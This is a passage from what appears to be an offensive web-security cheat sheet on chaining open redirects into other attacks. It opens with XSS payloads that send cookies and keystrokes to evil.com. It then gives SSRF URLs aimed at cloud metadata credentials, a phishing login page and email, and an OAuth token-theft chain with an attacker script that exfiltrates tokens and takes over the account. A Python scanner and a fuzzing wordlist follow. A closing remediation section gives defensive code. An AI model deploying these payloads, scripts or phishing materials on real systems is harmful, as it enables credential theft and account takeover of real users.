https://target.com/redirect?url=%0d%0a%0d%0a<script>alert(document.cookie)</script>
```

**Cookie Stealer via Redirect → XSS:**

```text
https://target.com/redirect?url=javascript:document.location='https://evil.com/steal?c='+document.cookie
```

**Session Hijack via Redirect → XSS:**

```text
https://target.com/redirect?url=javascript:fetch('https://evil.com/steal?c='+document.cookie)
```

**Keylogger via Redirect → XSS:**

```text
https://target.com/redirect?url=javascript:document.onkeypress=function(e){fetch('https://evil.com/log?k='+e.key)}
```
::

### Open Redirect → SSRF

::collapsible
---
label: "Server-Side Request Forgery via Redirect"
---

When a **server-side component** follows redirects, an Open Redirect can be chained to access internal resources.

```text [Scenario: URL preview/unfurl feature]
# Application fetches URL metadata (link preview)
POST /api/preview HTTP/1.1
Content-Type: application/json

{"url": "https://target.com/redirect?url=http://169.254.169.254/latest/meta-data/"}

# Application fetches target.com (allowed domain) ✅
# target.com redirects to AWS metadata endpoint
# Application follows redirect and returns metadata 💀
```

```text [Scenario: Webhook URL validation]
POST /api/webhooks HTTP/1.1
Content-Type: application/json

{
  "callback_url": "https://target.com/redirect?url=http://internal-admin:8080/"
}
# Webhook validator checks target.com (valid) ✅
# But the redirect leads to internal admin panel 💀
```

```text [Scenario: Image/avatar URL]
PUT /api/profile HTTP/1.1
Content-Type: application/json

{
  "avatar_url": "https://target.com/redirect?url=http://127.0.0.1:3306/"
}
# Server fetches "avatar" from internal MySQL port
```

```text [Scenario: PDF/document generator]
POST /api/generate-pdf HTTP/1.1
Content-Type: application/json

{
  "source_url": "https://target.com/redirect?url=file:///etc/passwd"
}
# PDF generator follows redirect to local file
```

```text [SSRF — AWS Metadata]
https://target.com/redirect?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

```text [SSRF — Internal Services]
https://target.com/redirect?url=http://localhost:8080/admin
https://target.com/redirect?url=http://10.0.0.1:8443/
https://target.com/redirect?url=http://192.168.1.1/
```

```text [SSRF — Cloud Metadata]
https://target.com/redirect?url=http://metadata.google.internal/computeMetadata/v1/
https://target.com/redirect?url=http://169.254.169.254/metadata/identity/oauth2/token
```
::

### Open Redirect → Phishing

::collapsible
---
label: "Credential Phishing via Trusted Domain"
---

```text [Phishing Login Page]
https://target.com/redirect?url=https://evil.com/target-login.html

# evil.com hosts a pixel-perfect clone of target.com's login page
# Victim sees target.com in the URL → trusts it
# Enters credentials → sent to attacker
```

```text [Phishing with Pre-filled Data]
https://target.com/redirect?url=https://evil.com/login?error=session_expired&email=victim@target.com

# Shows "Session expired, please log in again"
# Email pre-filled → victim just enters password
```

```text [Multi-Step Phishing]
# Step 1: Legitimate-looking link
https://target.com/redirect?url=https://evil.com/verify

# evil.com/verify shows: "Your account requires verification"
# "Enter your password to continue"
# Victim enters password → captured
# Redirect back to real target.com → seamless experience
```

```text [QR Code Phishing]
# Generate QR code containing:
https://target.com/redirect?url=https://evil.com/mobile-login

# QR codes don't show the full URL
# Victim scans → sees target.com briefly → redirected to phishing
```

```text [Email Phishing — Bypass Email Filters]
Subject: Security Alert - Unusual Login Activity

Dear User,

We detected suspicious activity on your account.
Please verify your identity:

https://target.com/redirect?url=https://evil.com/verify-identity

# Email security filters see target.com domain → allows through
# Victim clicks → redirected to phishing page
```

**Phishing Page Template:**

```html [phishing_page.html]
<!DOCTYPE html>
<html>
<head>
    <title>target.com - Login</title>
    <!-- Copy target.com's CSS and branding -->
    <link rel="icon" href="https://target.com/favicon.ico">
    <style>
        /* Clone target.com's login page styles */
    </style>
</head>
<body>
    <h2>Session Expired</h2>
    <p>Please log in again to continue.</p>
    <form action="https://evil.com/capture" method="POST">
        <input type="email" name="email" placeholder="Email">
        <input type="password" name="password" placeholder="Password">
        <button type="submit">Log In</button>
    </form>
</body>
</html>
```
::

### Open Redirect → Cache Poisoning

::collapsible
---
label: "Web Cache Poisoning via Open Redirect"
---

```text [Cache Poisoning Flow]
# Step 1: Find cached redirect endpoint
GET /redirect?url=https://evil.com HTTP/1.1
Host: target.com

# Step 2: If the redirect response is cached by CDN/proxy:
# All subsequent users requesting /redirect get redirected to evil.com
# from the cache — no interaction with origin server needed
```

```text [Cache Key Manipulation]
# Add cache buster that doesn't affect redirect but changes cache key
GET /redirect?url=https://evil.com&cachebuster=unique123 HTTP/1.1

# Or use unkeyed headers:
GET /redirect?url=https://evil.com HTTP/1.1
X-Forwarded-Host: evil.com
```

```text [Persistent Redirect Cache]
# If redirect has Cache-Control: public, max-age=86400
# Poisoned redirect persists for 24 hours
# All users see the malicious redirect
```
::

### Open Redirect → CSRF

::collapsible
---
label: "Cross-Site Request Forgery via Open Redirect"
---

```text [CSRF Token Leak via Redirect]
# If CSRF token is in the URL and redirect leaks it via Referer header

# Step 1: Victim visits a page with CSRF token in URL:
https://target.com/settings?csrf_token=SECRET_TOKEN

# Step 2: Page contains link with open redirect:
<a href="https://target.com/redirect?url=https://evil.com">Click here</a>

# Step 3: When victim clicks, Referer header leaks token:
GET / HTTP/1.1
Host: evil.com
Referer: https://target.com/settings?csrf_token=SECRET_TOKEN

# Step 4: Attacker uses stolen CSRF token for CSRF attack
```

```text [Bypass SameSite Cookie with Redirect]
# SameSite=Lax cookies are sent with top-level GET navigations
# Open redirect creates a "same-site" navigation context

# Redirect that triggers state-changing GET:
https://target.com/redirect?url=https://target.com/delete-account?confirm=true
# Cookies are sent because it starts from target.com
```
::

### Open Redirect → Content Injection

::collapsible
---
label: "Content Injection & Defacement via Redirect"
---

```text [Meta Refresh Injection]
# If the redirect is implemented via HTML meta tag and input is reflected:
<meta http-equiv="refresh" content="0; url=USER_INPUT">

# Inject:
" onload="alert(1)" "
0; url=https://evil.com
```

```text [Iframe Injection via Data URI]
https://target.com/redirect?url=data:text/html,<iframe src="https://evil.com" width="100%" height="100%" style="border:none;position:fixed;top:0;left:0">
```

```text [Full Page Replacement via Data URI]
https://target.com/redirect?url=data:text/html;base64,PGh0bWw+PGJvZHk+PGgxPkhhY2tlZDwvaDE+PC9ib2R5PjwvaHRtbD4=
# Base64 decodes to: <html><body><h1>Hacked</h1></body></html>
```
::

---

## Privilege Escalation via Open Redirect

::card-group
  ::card
  ---
  title: "OAuth Token Theft → Account Takeover"
  icon: i-lucide-key-round
  ---
  Chain Open Redirect with OAuth `redirect_uri` to steal authorization codes and access tokens. Exchange for full account access including admin accounts.
  ::

  ::card
  ---
  title: "SSO/SAML Bypass → Admin Access"
  icon: i-lucide-shield-alert
  ---
  Redirect SSO/SAML assertion endpoints to capture authentication tokens. Replay captured SAML responses to authenticate as any user.
  ::

  ::card
  ---
  title: "Credential Phishing → Admin Login"
  icon: i-lucide-user-check
  ---
  Use the trusted domain reputation to phish admin credentials. The trusted URL bypasses security training awareness and email filters.
  ::

  ::card
  ---
  title: "SSRF → Internal Service Access"
  icon: i-lucide-server
  ---
  Chain Open Redirect with server-side URL fetching features to access internal services, admin panels, and cloud metadata endpoints.
  ::

  ::card
  ---
  title: "Session Token Leak → Session Hijack"
  icon: i-lucide-cookie
  ---
  If session tokens are passed in URL parameters, an Open Redirect leaks them via the `Referer` header to the attacker's domain.
  ::

  ::card
  ---
  title: "WAF/Filter Bypass → Exploit Delivery"
  icon: i-lucide-shield-off
  ---
  Use the trusted domain's Open Redirect to bypass URL reputation checks, email security gateways, and corporate web filters that block direct access to malicious domains.
  ::

  ::card
  ---
  title: "Cache Poisoning → Mass Compromise"
  icon: i-lucide-database
  ---
  Poison CDN/proxy cache with a malicious redirect. All users who access the cached URL are redirected to attacker-controlled content.
  ::

  ::card
  ---
  title: "JWT/Token Leak via Redirect"
  icon: i-lucide-file-key
  ---
  If authentication tokens are included in redirect URLs or passed via fragments, the Open Redirect can exfiltrate them to the attacker's server.
  ::
::

### Full Attack Chain Example

::steps{level="4"}

#### Discover Open Redirect

```http
GET /auth/callback?next=https://evil.com HTTP/1.1
Host: target.com

# Response:
HTTP/1.1 302 Found
Location: https://evil.com
```

Confirmed: `/auth/callback?next=` is an Open Redirect.

#### Identify OAuth Flow

```http
GET /oauth/authorize?client_id=WEB_APP&redirect_uri=https://target.com/auth/callback&response_type=token&scope=profile HTTP/1.1
Host: auth.target.com
```

OAuth uses `implicit` flow (`response_type=token`) — token is in the URL fragment.

#### Craft Chained URL

```text
https://auth.target.com/oauth/authorize?client_id=WEB_APP&redirect_uri=https://target.com/auth/callback?next=https://evil.com/steal&response_type=token&scope=profile+email+admin
```

#### Victim Clicks URL

1. Victim visits the crafted URL
2. Auth server validates `redirect_uri=https://target.com/auth/callback` ✅
3. User authorizes (or auto-authorizes if already logged in)
4. Auth server redirects to: `https://target.com/auth/callback?next=https://evil.com/steal#access_token=SECRET_TOKEN`
5. Open redirect forwards to: `https://evil.com/steal#access_token=SECRET_TOKEN`

#### Attacker Captures Token

```javascript [steal.html — Attacker's Server]
<script>
// Token is in the URL fragment
var token = window.location.hash.substring(1);
var params = new URLSearchParams(token);
var accessToken = params.get('access_token');

// Send to attacker's API
fetch('https://evil.com/api/capture', {
    method: 'POST',
    body: JSON.stringify({token: accessToken}),
    headers: {'Content-Type': 'application/json'}
});

// Redirect victim back to legitimate site
window.location = 'https://target.com/dashboard';
</script>
```

#### Attacker Uses Token for Account Takeover

```http
GET /api/me HTTP/1.1
Host: api.target.com
Authorization: Bearer SECRET_TOKEN

# Returns victim's profile, email, and admin status
```

```http
PUT /api/me HTTP/1.1
Host: api.target.com
Authorization: Bearer SECRET_TOKEN
Content-Type: application/json

{"email": "attacker@evil.com", "password": "new_password"}

# Changes victim's email and password → permanent account takeover
```

::

---

## Open Redirect in Different Contexts

### Login/Logout Redirects

::collapsible
---
label: "Post-Authentication Redirect Exploitation"
---

```text [Post-Login Redirect]
https://target.com/login?next=https://evil.com
https://target.com/login?returnUrl=https://evil.com
https://target.com/login?redirect=https://evil.com
https://target.com/login?continue=https://evil.com
```

```text [Post-Logout Redirect]
https://target.com/logout?redirect=https://evil.com
https://target.com/logout?next=https://evil.com
https://target.com/logout?returnTo=https://evil.com
```

```text [Post-Registration Redirect]
https://target.com/register?next=https://evil.com
https://target.com/signup?callback=https://evil.com
```

```text [Post-Password-Reset Redirect]
https://target.com/reset-password?next=https://evil.com
https://target.com/forgot-password?return=https://evil.com
```

```text [Session Expiry Redirect]
https://target.com/session-expired?return=https://evil.com
https://target.com/timeout?next=https://evil.com
```
::

### Email & Tracking Links

::collapsible
---
label: "Email Link & Click Tracker Exploitation"
---

```text [Email Click Tracker]
https://target.com/track/click?url=https://evil.com&campaign=123
https://target.com/email/redirect?link=https://evil.com
https://target.com/l?u=https://evil.com
```

```text [Unsubscribe Link]
https://target.com/unsubscribe?redirect=https://evil.com
```

```text [Email Verification Link]
https://target.com/verify-email?token=VALID&next=https://evil.com
```

```text [Newsletter Link Wrapper]
https://target.com/newsletter/link?url=https://evil.com&id=123
```

```text [Marketing UTM Link]
https://target.com/go?utm_source=email&destination=https://evil.com
```

```text [Short URL / Link Shortener]
https://target.com/s/abc123
# If the short URL service allows creating links to external domains
```
::

### Social & Sharing Features

::collapsible
---
label: "Social Authentication & Sharing Redirect Exploitation"
---

```text [Social Login Callback]
https://target.com/auth/google/callback?redirect=https://evil.com
https://target.com/auth/facebook/callback?next=https://evil.com
https://target.com/auth/github/callback?return=https://evil.com
```

```text [Share Button Redirect]
https://target.com/share?url=https://evil.com
https://target.com/share/facebook?link=https://evil.com
```

```text [Invitation Link]
https://target.com/invite/accept?redirect=https://evil.com
```

```text [App Install/Download Redirect]
https://target.com/download?platform=ios&redirect=https://evil.com
```

```text [Deep Link / Universal Link Handler]
https://target.com/.well-known/apple-app-site-association → redirect
https://target.com/app/open?url=https://evil.com
```
::

### Payment & Checkout Redirects

::collapsible
---
label: "Payment Flow Redirect Exploitation"
---

```text [Payment Success Redirect]
https://target.com/payment/callback?status=success&redirect=https://evil.com
```

```text [Payment Cancel Redirect]
https://target.com/payment/cancel?return=https://evil.com
```

```text [Checkout Complete Redirect]
https://target.com/checkout/complete?next=https://evil.com
```

```text [Payment Gateway Return URL]
https://target.com/payment/return?gateway_redirect=https://evil.com
```

```text [Subscription Confirmation]
https://target.com/subscribe/confirm?redirect=https://evil.com
```

```text [PayPal Return URL Manipulation]
https://target.com/paypal/return?returnUrl=https://evil.com
```

```text [Stripe Checkout Session]
https://target.com/checkout/session?success_url=https://evil.com&cancel_url=https://evil.com
```
::

### API & Microservice Redirects

::collapsible
---
label: "API-Level Open Redirect"
---

```http [API Redirect Response]
GET /api/v1/redirect?url=https://evil.com HTTP/1.1
Host: api.target.com
Authorization: Bearer TOKEN
```

```http [API Short URL Resolution]
GET /api/v1/resolve?short=abc123&follow=true HTTP/1.1
Host: api.target.com
```

```http [API Proxy/Fetch Endpoint]
GET /api/v1/fetch?url=https://evil.com HTTP/1.1
Host: api.target.com

# Server-side: fetches the URL and returns content
# May follow redirects to internal services
```

```http [GraphQL Redirect]
POST /graphql HTTP/1.1
Content-Type: application/json

{
  "query": "mutation { createLink(url: \"https://evil.com\") { shortUrl } }"
}
```

```http [Webhook Verification Redirect]
POST /api/webhooks/verify HTTP/1.1
Content-Type: application/json

{
  "callback_url": "https://target.com/redirect?url=http://169.254.169.254/"
}
# Server verifies callback URL by sending a request
# Open redirect bounces to internal metadata
```
::

---

## Automation & Tooling

### Open Redirect Scanner Script

::collapsible
---
label: "Python Open Redirect Scanner"
---

```python [open_redirect_scanner.py]
#!/usr/bin/env python3
"""
Open Redirect Vulnerability Scanner
Tests multiple bypass techniques against redirect parameters.
"""

import requests
import sys
import urllib.parse
from concurrent.futures import ThreadPoolExecutor, as_completed
import warnings
warnings.filterwarnings('ignore')

# === CONFIGURATION ===
CALLBACK_DOMAIN = "evil.com"  # Your controlled domain
TIMEOUT = 10
MAX_REDIRECTS = 0  # Don't follow redirects (we want to inspect them)
THREADS = 10

# === PAYLOADS ===
def generate_payloads(callback_domain):
    """Generate comprehensive Open Redirect payloads."""
    payloads = [
        # Basic
        f"https://{callback_domain}",
        f"http://{callback_domain}",
        f"//{callback_domain}",
        f"///{callback_domain}",
        f"////{callback_domain}",
        
        # Backslash
        f"\\\\{callback_domain}",
        f"\\/\\/{callback_domain}",
        f"/\\{callback_domain}",
        f"\\/{callback_domain}",
        
        # Protocol
        f"https:{callback_domain}",
        f"https://{callback_domain}",
        f"https:////{callback_domain}",
        f"://{callback_domain}",
        
        # @ symbol
        f"https://target.com@{callback_domain}",
        f"https://target.com:80@{callback_domain}",
        f"//target.com@{callback_domain}",
        
        # Encoded
        f"https://%65%76%69%6c%2e%63%6f%6d",
        f"https:%2f%2f{callback_domain}",
        f"%2f%2f{callback_domain}",
        f"%252f%252f{callback_domain}",
        f"https%3a%2f%2f{callback_domain}",
        
        # Domain confusion
        f"https://{callback_domain}%00.target.com",
        f"https://{callback_domain}?.target.com",
        f"https://{callback_domain}#.target.com",
        f"https://target.com.{callback_domain}",
        f"https://{callback_domain}/target.com",
        
        # Whitespace
        f"%20https://{callback_domain}",
        f"%09https://{callback_domain}",
        f"%0ahttps://{callback_domain}",
        f"%0dhttps://{callback_domain}",
        f"%0d%0ahttps://{callback_domain}",
        
        # Path-based
        f"/../../../{callback_domain}",
        f"/.{callback_domain}",
        f"/@{callback_domain}",
        
        # JavaScript (for DOM-based)
        "javascript:alert(1)",
        f"javascript://target.com/%0aalert(1)",
        
        # Data URI
        "data:text/html,<script>alert(1)</script>",
        "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
        
        # CRLF
        f"%0d%0aLocation:%20https://{callback_domain}",
        f"%0d%0a%0d%0a<script>window.location='https://{callback_domain}'</script>",
        
        # Special characters
        f"https://{callback_domain}.",
        f"https://{callback_domain}./",
        f"https://{callback_domain}:443",
        f"https://{callback_domain}:80",
    ]
    return payloads


# === REDIRECT PARAMETERS ===
REDIRECT_PARAMS = [
    'url', 'redirect', 'redirect_url', 'redirect_uri', 'next', 'nextUrl',
    'next_url', 'return', 'returnUrl', 'return_url', 'returnTo', 'return_to',
    'rurl', 'redir', 'dest', 'destination', 'go', 'goto', 'target',
    'target_url', 'link', 'out', 'forward', 'continue', 'callback',
    'callback_url', 'path', 'to', 'uri', 'u', 'r', 'ref', 'service',
    'logout', 'login_url', 'success_url', 'error_url', 'cancel_url',
    'RelayState', 'page', 'view', 'from', 'site', 'checkout_url',
]


def test_redirect(base_url, param, payload, session):
    """Test a single redirect payload."""
    try:
        test_url = f"{base_url}?{param}={urllib.parse.quote(payload, safe='')}"
        
        response = session.get(
            test_url,
            allow_redirects=False,
            timeout=TIMEOUT,
            verify=False
        )
        
        # Check for redirect in Location header
        location = response.headers.get('Location', '')
        
        # Check for redirect in response body (meta refresh, JavaScript)
        body = response.text.lower()
        
        is_vulnerable = False
        redirect_type = ""
        
        if response.status_code in [301, 302, 303, 307, 308]:
            if CALLBACK_DOMAIN in location or 'evil' in location:
                is_vulnerable = True
                redirect_type = f"HTTP {response.status_code} → {location}"
            elif 'javascript:' in location:
                is_vulnerable = True
                redirect_type = f"JavaScript Protocol → {location}"
        
        if f'url={CALLBACK_DOMAIN}' in body or f"'{CALLBACK_DOMAIN}'" in body:
            if 'window.location' in body or 'document.location' in body:
                is_vulnerable = True
                redirect_type = "JavaScript Redirect in Body"
        
        if f'url={CALLBACK_DOMAIN}' in body and 'meta' in body and 'refresh' in body:
            is_vulnerable = True
            redirect_type = "Meta Refresh Redirect"
        
        if is_vulnerable:
            return {
                'vulnerable': True,
                'url': test_url,
                'param': param,
                'payload': payload,
                'type': redirect_type,
                'status': response.status_code
            }
        
        return {'vulnerable': False}
        
    except Exception as e:
        return {'vulnerable': False, 'error': str(e)}


def scan_url(base_url):
    """Scan a URL for Open Redirect vulnerabilities."""
    print(f"\n{'='*70}")
    print(f"  Open Redirect Scanner")
    print(f"{'='*70}")
    print(f"  Target: {base_url}")
    print(f"  Callback: {CALLBACK_DOMAIN}")
    print(f"  Parameters: {len(REDIRECT_PARAMS)}")
    
    payloads = generate_payloads(CALLBACK_DOMAIN)
    print(f"  Payloads: {len(payloads)}")
    print(f"  Total Tests: {len(REDIRECT_PARAMS) * len(payloads)}")
    print(f"{'='*70}\n")
    
    session = requests.Session()
    session.headers.update({
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
    })
    
    findings = []
    
    with ThreadPoolExecutor(max_workers=THREADS) as executor:
        futures = {}
        
        for param in REDIRECT_PARAMS:
            for payload in payloads:
                future = executor.submit(test_redirect, base_url, param, payload, session)
                futures[future] = (param, payload)
        
        completed = 0
        total = len(futures)
        
        for future in as_completed(futures):
            completed += 1
            result = future.result()
            
            if result.get('vulnerable'):
                findings.append(result)
                print(f"  [+] VULNERABLE: {result['param']}={result['payload'][:50]}")
                print(f"      Type: {result['type']}")
                print(f"      Status: {result['status']}")
                print()
            
            if completed % 100 == 0:
                sys.stdout.write(f"\r  [*] Progress: {completed}/{total} ({len(findings)} found)")
                sys.stdout.flush()
    
    print(f"\n\n{'='*70}")
    print(f"  Scan Complete")
    print(f"{'='*70}")
    print(f"  Total Tests: {total}")
    print(f"  Vulnerabilities Found: {len(findings)}")
    
    if findings:
        print(f"\n  Findings:")
        for i, f in enumerate(findings, 1):
            print(f"\n  [{i}] Parameter: {f['param']}")
            print(f"      Payload: {f['payload']}")
            print(f"      Type: {f['type']}")
            print(f"      URL: {f['url']}")
    
    return findings


# === MAIN ===
if __name__ == "__main__":
    if len(sys.argv) < 2:
        print(f"Usage: {sys.argv[0]} <base_url>")
        print(f"Example: {sys.argv[0]} https://target.com/redirect")
        sys.exit(1)
    
    base_url = sys.argv[1]
    scan_url(base_url)
```
::

### Burp Suite Intruder Wordlist

::collapsible
---
label: "Open Redirect Fuzzing Wordlist"
---

```text [open_redirect_fuzz.txt]
https://evil.com
http://evil.com
//evil.com
///evil.com
////evil.com
\\evil.com
/\evil.com
\/evil.com
//evil.com/
https://evil.com/
https://evil.com/phishing
https://evil.com?target.com
https://evil.com#target.com
https://evil.com\.target.com
https://target.com@evil.com
https://target.com:80@evil.com
https://target.com%40evil.com
https://target.com.evil.com
https://evil.com/target.com
https://evil.com%00.target.com
https://evil.com?.target.com
https://evil.com#.target.com
https:%2f%2fevil.com
%2f%2fevil.com
%252f%252fevil.com
%0d%0aLocation:%20https://evil.com
%09https://evil.com
%0ahttps://evil.com
%0dhttps://evil.com
%20https://evil.com
https%3a%2f%2fevil.com
https%3a//evil.com
://evil.com
:evil.com
/evil.com
/.evil.com
/@evil.com
/../../../evil.com
/..%2f..%2fevil.com
javascript:alert(1)
javascript://target.com/%0aalert(1)
data:text/html,<script>alert(1)</script>
data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
https://evil.com.
https://evil.com./
https://evil.com:443
https://evil.com:8443
https://evil.com:80
%00https://evil.com
%0bhttps://evil.com
%0chttps://evil.com
https://127.0.0.1
https://0x7f000001
https://2130706433
http://169.254.169.254
https://evil。com
https:evil.com
https//evil.com
https:/evil.com
HtTpS://evil.com
HTTPS://EVIL.COM
https://evil.com%23@target.com
https://evil.com%2f@target.com
```
::

---

## Attack Methodology

::steps{level="3"}

### Reconnaissance

Map all redirect functionality across the application.


  ::field{name="URL Parameters" type="string"}
  Identify all URL parameters that control redirect behavior. Check login, logout, OAuth, email links, and error pages.
  ::

  ::field{name="JavaScript Sources" type="string"}
  Review client-side JavaScript for DOM-based redirect sinks: `window.location`, `document.location`, `location.href`, `location.assign()`, `location.replace()`.
  ::

  ::field{name="Response Headers" type="string"}
  Check `Location`, `Refresh`, and custom headers for reflected user input.
  ::

  ::field{name="HTML Content" type="string"}
  Look for `<meta http-equiv="refresh">` tags and JavaScript redirects in HTML that use user-controlled values.
  ::

  ::field{name="OAuth Flows" type="string"}
  Map OAuth authorization endpoints, `redirect_uri` parameters, callback URLs, and token exchange flows.
  ::

  ::field{name="Email/Notification Links" type="string"}
  Check click tracking URLs, unsubscribe links, verification links, and any email-embedded redirect URLs.
  ::


### Validation Analysis

Determine what validation (if any) the application performs on redirect destinations.

| Validation Type | Test Method | Bypass Strategy |
|----------------|-------------|-----------------|
| No validation | Direct external URL | Basic payloads |
| Protocol check | Block `http://`/`https://` | `//`, `\/`, encoded |
| Domain whitelist | Only allow `target.com` | `@`, subdomain, path tricks |
| Regex matching | Pattern-based | Regex bypass, anchoring issues |
| URL parsing | Library-based validation | Parser differentials |
| Path-only allowed | Block absolute URLs | `//evil.com`, `/\evil.com` |
| Starts-with check | Must start with `/` | `//evil.com`, `/\evil.com`, `/@evil.com` |

### Payload Testing

Test bypass payloads against the identified validation.

Start with basic payloads, then progress to encoded, protocol-manipulated, domain-confused, and special character payloads.

### Impact Assessment

Determine the maximum impact through chaining.

| Chain Target | Impact | Severity |
|-------------|--------|----------|
| OAuth token theft | Account takeover | **Critical** |
| Credential phishing | Mass compromise | **High** |
| SSRF to internal services | Internal network access | **High** |
| XSS via javascript: | Session hijacking | **High** |
| Cache poisoning | Mass redirect | **High** |
| CSRF token leak | Cross-site actions | **Medium** |
| Standalone phishing | Social engineering | **Medium** |

### Documentation

Document the Open Redirect with chain potential for maximum impact reporting.

::

---

## Remediation & Defense

::card-group
  ::card
  ---
  title: Avoid User-Controlled Redirects
  icon: i-lucide-shield-check
  ---
  The strongest defense is to **not use user input for redirect destinations** at all. Use server-side redirect mappings:

  ```python
  REDIRECT_MAP = {
      'dashboard': '/dashboard',
      'profile': '/profile',
      'settings': '/settings',
  }
  
  @app.route('/redirect')
  def safe_redirect():
      key = request.args.get('page', 'dashboard')
      destination = REDIRECT_MAP.get(key, '/dashboard')
      return redirect(destination)
  ```

  Users submit a **key** (`?page=dashboard`), not a URL. The server maps keys to safe destinations.
  ::

  ::card
  ---
  title: Strict Allowlist Validation
  icon: i-lucide-list-check
  ---
  If user-controlled redirects are necessary, validate the destination against a strict **allowlist** of permitted domains or paths:

  ```python
  ALLOWED_DOMAINS = ['target.com', 'www.target.com', 'app.target.com']
  
  def is_safe_redirect(url):
      from urllib.parse import urlparse
      parsed = urlparse(url)
      
      # Must have scheme and netloc
      if not parsed.scheme or not parsed.netloc:
          return False
      
      # Must be HTTPS
      if parsed.scheme != 'https':
          return False
      
      # Domain must be in allowlist (exact match)
      if parsed.netloc.lower() not in ALLOWED_DOMAINS:
          return False
      
      # No credentials in URL
      if '@' in parsed.netloc:
          return False
      
      return True
  ```
  ::

  ::card
  ---
  title: Relative URL Only
  icon: i-lucide-link
  ---
  Only allow **relative paths** (starting with `/`) and reject any absolute URL, protocol, or domain:

  ```python
  def is_relative_url(url):
      # Must start with single /
      if not url.startswith('/'):
          return False
      # Must NOT start with //
      if url.startswith('//'):
          return False
      # Must NOT contain protocol
      if '://' in url:
          return False
      # Must NOT contain backslash
      if '\\' in url:
          return False
      # Must NOT contain @
      if '@' in url:
          return False
      return True
  ```
  ::

  ::card
  ---
  title: URL Parsing Before Validation
  icon: i-lucide-code
  ---
  **Parse** the URL using a proper URL parser library before validation. Never validate against raw string matching. Decode URL encoding before parsing:

  ```python
  from urllib.parse import urlparse, unquote
  
  def validate_redirect(url):
      # Decode multiple levels of encoding
      decoded = unquote(unquote(url))
      parsed = urlparse(decoded)
      
      # Validate parsed components
      if parsed.scheme and parsed.scheme not in ['https']:
          return False
      if parsed.netloc and parsed.netloc not in ALLOWED_DOMAINS:
          return False
      return True
  ```
  ::

  ::card
  ---
  title: Framework-Specific Protections
  icon: i-lucide-wrench
  ---
  Use built-in framework protections:

  ```python
  # Django — url_has_allowed_host_and_scheme()
  from django.utils.http import url_has_allowed_host_and_scheme
  
  if url_has_allowed_host_and_scheme(next_url, allowed_hosts={'target.com'}):
      return redirect(next_url)
  ```

  ```csharp
  // ASP.NET — LocalRedirect()
  return LocalRedirect(returnUrl);  // Only allows local paths
  ```

  ```ruby
  # Rails — Only allow path
  redirect_to URI.parse(params[:next]).path
  ```
  ::

  ::card
  ---
  title: Interstitial Warning Page
  icon: i-lucide-alert-triangle
  ---
  When redirecting to external domains, show a **warning page** that informs the user they are leaving the site:

  ```html
  <h2>You are leaving target.com</h2>
  <p>You will be redirected to: <strong>https://external-site.com</strong></p>
  <p>This is not controlled by target.com.</p>
  <a href="https://external-site.com">Continue</a>
  <a href="/">Go back to target.com</a>
  ```
  ::

  ::card
  ---
  title: Strip Dangerous Characters
  icon: i-lucide-filter
  ---
  Remove or reject URLs containing: CRLF characters (`%0d`, `%0a`), null bytes (`%00`), backslashes (`\`), `@` symbols in the hostname section, `javascript:`, `data:`, and `vbscript:` protocols.
  ::

  ::card
  ---
  title: OAuth redirect_uri Strict Matching
  icon: i-lucide-lock
  ---
  OAuth servers must enforce **exact match** on `redirect_uri` — not prefix matching, not wildcard matching. The full URI including path and query parameters must match the registered value exactly.
  ::

  ::card
  ---
  title: Referer Policy
  icon: i-lucide-eye-off
  ---
  Set `Referrer-Policy: no-referrer` or `Referrer-Policy: same-origin` to prevent token leakage via the Referer header when users navigate to external sites.

  ```http
  Referrer-Policy: strict-origin-when-cross-origin
  ```
  ::

  ::card
  ---
  title: Content Security Policy
  icon: i-lucide-shield
  ---
  Use CSP `navigate-to` directive (where supported) to restrict allowed navigation destinations:

  ```http
  Content-Security-Policy: navigate-to 'self' https://trusted-partner.com
  ```
  ::
::

---

## Tools

::card-group
  ::card
  ---
  title: Burp Suite
  icon: i-lucide-bug
  to: https://portswigger.net/burp
  target: _blank
  ---
  Intercept and modify redirect parameters. Use Intruder with the Open Redirect wordlist for automated testing. Scanner detects basic Open Redirects automatically.
  ::

  ::card
  ---
  title: Oralyzer
  icon: i-lucide-radar
  to: https://github.com/r0075h3ll/Oralyzer
  target: _blank
  ---
  Dedicated Open Redirect analysis tool. Tests multiple bypass payloads against redirect parameters and validates actual redirect behavior.
  ::

  ::card
  ---
  title: OpenRedireX
  icon: i-lucide-external-link
  to: https://github.com/devanshbatham/OpenRedireX
  target: _blank
  ---
  Fast Open Redirect fuzzer that tests URLs with multiple bypass payloads. Supports concurrent scanning for speed.
  ::

  ::card
  ---
  title: Galer
  icon: i-lucide-link
  to: https://github.com/dwisiswant0/galer
  target: _blank
  ---
  Extracts URLs from web pages and tests for Open Redirect. Useful for crawling and identifying redirect endpoints at scale.
  ::

  ::card
  ---
  title: ffuf
  icon: i-lucide-zap
  to: https://github.com/ffuf/ffuf
  target: _blank
  ---
  Fast web fuzzer. Use with redirect parameter and payload wordlists to test multiple bypass techniques efficiently.
  ::

  ::card
  ---
  title: nuclei
  icon: i-lucide-atom
  to: https://github.com/projectdiscovery/nuclei
  target: _blank
  ---
  Template-based vulnerability scanner with Open Redirect detection templates. Supports bulk scanning of multiple targets.
  ::

  ::card
  ---
  title: ParamSpider
  icon: i-lucide-spider
  to: https://github.com/devanshbatham/ParamSpider
  target: _blank
  ---
  Extracts parameters from web archives. Identifies potential redirect parameters from historical URL data.
  ::

  ::card
  ---
  title: waybackurls
  icon: i-lucide-history
  to: https://github.com/tomnomnom/waybackurls
  target: _blank
  ---
  Fetch URLs from Wayback Machine. Find historical redirect endpoints and parameters that may still be active.
  ::

  ::card
  ---
  title: Interactsh (interact.sh)
  icon: i-lucide-globe
  to: https://github.com/projectdiscovery/interactsh
  target: _blank
  ---
  Out-of-band interaction tool. Use as redirect destination to confirm blind Open Redirects where you can't see the response directly.
  ::
::